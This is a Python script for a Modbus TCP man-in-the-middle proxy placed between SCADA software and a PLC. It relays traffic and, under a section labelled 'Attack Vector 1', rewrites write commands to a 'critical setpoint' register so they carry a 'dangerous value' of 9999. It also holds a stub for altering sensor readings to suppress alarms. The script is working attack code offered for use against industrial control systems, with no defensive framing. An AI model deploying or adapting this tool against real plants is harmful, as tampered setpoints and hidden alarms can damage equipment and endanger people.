#!/usr/bin/env python3
import socket
import threading
import struct

class ModbusMITMProxy:
    def __init__(self, listen_port, target_ip, target_port):
        self.listen_port = listen_port
        self.target_ip = target_ip
        self.target_port = target_port

    def handle_client(self, client_socket):
        """
        Handle incoming client connection (SCADA)
        """
        # Connect to real PLC
        plc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        plc_socket.connect((self.target_ip, self.target_port))

        # Relay traffic bidirectionally
        threading.Thread(target=self.forward, args=(client_socket, plc_socket, "SCADA→PLC")).start()
        threading.Thread(target=self.forward, args=(plc_socket, client_socket, "PLC→SCADA")).start()

    def forward(self, source, destination, direction):
        """
        Forward traffic between client and PLC with inspection/modification
        """
        while True:
            try:
                data = source.recv(4096)
                if not data:
                    break

                # Parse Modbus packet
                modified_data = self.inspect_and_modify(data, direction)

                # Forward (potentially modified)
                destination.send(modified_data)

            except Exception as e:
                break

    def inspect_and_modify(self, data, direction):
        """
        Inspect and optionally modify Modbus traffic
        """
        if len(data) < 8:
            return data

        # Parse MBAP header
        trans_id = struct.unpack('>H', data[0:2])[0]
        proto_id = struct.unpack('>H', data[2:4])[0]
        length = struct.unpack('>H', data[4:6])[0]
        unit_id = data[6]
        func_code = data[7]

        print(f"[{direction}] Trans ID: {trans_id}, FC: 0x{func_code:02X}, Unit: {unit_id}")

        # Attack Vector 1: Modify write commands
        if func_code == 0x06 and direction == "SCADA→PLC":  # Write Single Register
            # Extract register address and value
            register = struct.unpack('>H', data[8:10])[0]
            value = struct.unpack('>H', data[10:12])[0]

            print(f"    [!] Write to register {register}: {value}")

            # Malicious modification
            if register == 100:  # Critical setpoint register
                new_value = 9999  # Dangerous value
                modified_data = data[:10] + struct.pack('>H', new_value)
                print(f"    [ATTACK] Modified value: {value} → {new_value}")
                return modified_data

        # Attack Vector 2: Suppress alarms (block specific reads)
        if func_code == 0x03 and direction == "PLC→SCADA":  # Read Holding Registers response
            # Could modify sensor values in response
            pass

        return data  # Return unmodified if no attack

    def start(self):
        """
        Start proxy server
        """
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', self.listen_port))
        server.listen(5)

        print(f"[*] Modbus MITM proxy listening on port {self.listen_port}")
        print(f"[*] Forwarding to {self.target_ip}:{self.target_port}")

        while True:
            client_socket, addr = server.accept()
            print(f"[+] Connection from {addr}")
            threading.Thread(target=self.handle_client, args=(client_socket,)).start()

# Usage:
# proxy = ModbusMITMProxy(listen_port=502, target_ip='192.168.1.100', target_port=502)
# proxy.start()
